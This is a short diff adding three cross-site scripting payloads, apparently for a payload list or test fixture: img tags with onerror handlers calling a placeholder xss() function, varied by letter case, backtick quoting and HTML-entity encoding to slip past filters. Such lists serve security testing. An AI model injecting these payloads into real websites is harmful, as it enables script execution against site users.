@@ -1,0 +1,3 @@
+<img/src='.'onerror=xss()>
+<iMg/SrC=`.` OnError=xss()>
+<img src=xyz onerror=&#x78&#x73&#x73&#x28&#x29>
